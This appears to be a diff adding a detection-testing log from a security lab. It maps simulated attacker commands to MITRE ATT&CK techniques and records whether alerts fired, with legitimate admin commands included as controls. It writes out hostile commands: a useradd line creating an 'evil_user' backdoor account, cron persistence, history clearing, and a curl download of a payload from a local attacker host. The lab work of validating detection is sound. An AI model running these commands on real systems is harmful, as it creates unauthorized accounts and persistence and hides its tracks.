@@ -1,0 +1,10 @@
+id,time,command,attack_technique,technique_name,malicious,raised_alert,rule_level,notes
+V00,~10:16,"ssh in a loop with wrong password (brute force)",T1110,Brute Force,yes,yes,"confirm id/level","detected: Credential Access and PCI DSS 10.2.4 in the dashboard; used to validate the pipeline"
+C01,10:31,"useradd -M -N -r -s /bin/bash -c evil_account evil_user",T1136.001,Create Account: Local Account,yes,to fill,,"system account with a shell; requires root (sudo), prerequisite: already privileged"
+C02,10:42,"echo cron line > file && crontab file",T1053.003,Scheduled Task/Job: Cron,yes,to fill,,"per-user persistence, no root needed; harmless script only writes date to a log"
+C03,10:45,"local account enumeration",T1087.001,Account Discovery: Local Account,yes,to fill,,""
+C04,10:55,"clear command history",T1070.003,Indicator Removal: Clear Command History,yes,to fill,,""
+C05,11:11,"curl -o /tmp/payload.txt http://192.168.122.1:8000/payload.txt",T1105,Ingress Tool Transfer,yes,to fill,,"attacker host: python http.server on the laptop; check whether the alert comes from the curl process or the file on disk"
+L01,11:14,"sudo apt update && sudo apt upgrade",,legitimate activity,no,to fill,,"admin routine"
+L02,11:15,"sudo systemctl restart <service>",,legitimate activity,no,to fill,,"compare with the sudo alert from C01"
+L03,11:15,"a single wrong SSH password",,legitimate activity,no,to fill,,"potential false positive: one wrong password is normal"
